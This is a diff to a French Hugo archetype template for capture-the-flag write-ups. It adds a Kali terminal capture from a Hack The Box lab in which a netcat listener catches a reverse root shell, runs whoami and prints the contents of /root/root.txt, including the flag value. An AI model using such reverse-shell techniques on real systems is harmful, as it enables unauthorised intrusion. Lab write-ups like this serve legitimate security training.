@@ -1,4 +1,5 @@
 ---
+
 # === Archetype writeups – v1 (stable) ===
 # === Archetype: writeups (Page Bundle) ===
 # Copié vers content/writeups/<nom_ctf>/index.md
@@ -671,6 +672,27 @@ Dans le terminal Kali, tu obtiens un shell root.
 ```
 whoami
 ```
+
+```
+┌──(kali㉿kali)-[/mnt/kvm-md0/HTB/writeup]
+└─$ nc -lvnp 4444
+
+listening on [any] 4444 ...
+connect to [10.10.14.156] from (UNKNOWN) [10.129.43.121] 38928
+bash: cannot set terminal process group (6537): Inappropriate ioctl for device
+bash: no job control in this shell
+root@writeup:/#
+root@writeup:/# whoami
+whoami
+root
+root@writeup:/#
+root@writeup:/# cat /root/root.txt
+cat /root/root.txt
+e36c1e7288baa06c73718bddd79609cc
+root@writeup:/#
+```
+
+
 
 ---
 
